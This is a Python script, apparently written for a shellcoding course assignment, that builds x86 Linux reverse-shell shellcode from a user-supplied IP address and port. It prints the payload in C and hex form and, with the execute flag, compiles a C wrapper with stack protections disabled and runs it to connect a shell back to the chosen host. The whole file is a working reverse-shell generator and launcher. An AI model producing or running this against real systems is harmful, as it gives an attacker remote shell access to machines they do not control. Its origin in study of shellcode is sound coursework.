import sys
import argparse
import os

parser = argparse.ArgumentParser(description="Reverse-Shell Creator SLAE assignment 1")
parser.add_argument('-ip', '--ipaddress', help='defines the IP for the reverse shell', dest='ip')
parser.add_argument('-p', '--port', help='defines the port for the reverse shell, choose port 1024 to 65535', dest='port')
parser.add_argument('-e', '--execute', help='executes the bind shell', action='store_true', dest='execute')
results = parser.parse_args()

results.port = int(results.port)

if results.port < 1024 or results.port > 65535:
    sys.exit()

## ip comes in format xxx.xxx.xxx.xxx
ip_addresses = results.ip.split(".")
ip = ""
for counter in range(0, len(ip_addresses)):
    # ip to hex, cut 0x and fill with zero's if only one character
    ip_addresses[counter] = hex(int(ip_addresses[counter]))[2:].zfill(2)
    ip += ("\\x{}".format(ip_addresses[counter]))

## port becomes hex 0x400 to 0xffff -> cut off 0x
port = hex(results.port)[2:]
## fill up with zero until we have 4 characters
port = port.zfill(4)
port = "\\x{}\\x{}".format(port[0:2], port[2:4])

shellcode_c = "\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68{}\\x68\\x02\\x00{}\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80".format(ip, port)
shellcode_hex = shellcode_c.replace('\\x', '')

print("Shellcode in C-Format:")
print("Shellcode length = {} bytes".format(len(shellcode_hex)))
print("unsigned char code[] = \\")
print('\"\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x59\"')
print('\"\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68{}\\x68\\x02\\x00{}\"'.format(ip, port))
print('\"\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x6e\\x2f\"')
print('\"\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";')

print("\nShellcode in Hex-Format:")
print(shellcode_hex[:80])
print(shellcode_hex[80:160])

if results.execute:

    print("Spawn reverse shell on ip "+ str(results.ip) + " and port " + str(results.port))
    print("connecting...")

    f = open("shellcode.c", "w")
    f.write('#include<stdio.h>')
    f.write('\n#include<string.h>')
    f.write('\nunsigned char code[] = \\')
    f.write('\n\"\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x59\"')
    f.write('\n\"\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68{}\\x68\\x02\\x00{}\"'.format(ip, port))
    f.write('\n\"\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x6e\\x2f\"')
    f.write('\n\"\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";')
    f.write('\nint main(){')
    f.write('\nint (*ret)() = (int(*)())code;')
    f.write('\nret();}')
    f.close()

    os.system("gcc -fno-stack-protector -z execstack -m32 shellcode.c -o reverse_shell")
    os.system("./reverse_shell")





